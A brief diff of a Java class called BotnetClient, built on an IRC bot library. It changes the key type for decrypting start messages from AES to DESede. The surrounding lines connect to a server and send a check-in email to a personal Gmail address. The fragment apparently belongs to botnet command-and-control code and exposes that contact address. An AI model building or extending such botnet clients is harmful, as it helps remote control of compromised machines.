@@ -58,7 +58,7 @@ public class BotnetClient extends PircBot {
 			connect(SERVER, PORT);
 			sendEmail("shakalandro@gmail.com", new String[] {"shakalandro@gmail.com"}, "works", "sweetness");
 			
-			startKey = new SecretKeySpec(key, "AES");
+			startKey = new SecretKeySpec(key, "DESede");
 			//startCipher = Cipher.getInstance("AES");
 			//startCipher.init(Cipher.DECRYPT_MODE, startKey);
 			startMsgE = MsgEncrypt.getInstance(startKey);
